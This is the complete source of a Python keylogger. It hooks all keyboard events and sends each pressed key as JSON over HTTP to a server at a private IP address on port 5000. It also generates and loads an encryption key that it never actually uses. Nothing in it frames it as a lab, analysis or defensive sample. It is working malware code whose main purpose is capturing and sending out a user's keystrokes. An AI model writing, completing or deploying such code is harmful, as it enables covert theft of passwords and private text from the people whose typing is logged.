import keyboard
import requests
import time
from cryptography.fernet import Fernet

# Generate a key for encryption and save it
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

# Load the encryption key
def load_key():
    return open("key.key", "rb").read()

# Send logs to the server
def send_log(log):
    try:
        requests.post("http://192.168.1.9:5000/send_log", json={"log": log})
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to server: {e}")

# Hook for keyboard events
def on_key_event(event):
    log = f"{event.name} pressed"
    print(log)  # Print log for debugging
    send_log(log)

if __name__ == "__main__":
    # Generate a key if it doesn't exist
    try:
        key = load_key()
    except FileNotFoundError:
        generate_key()
        key = load_key()

    # Start listening to keyboard events
    keyboard.hook(on_key_event)
    keyboard.wait()  # Block forever
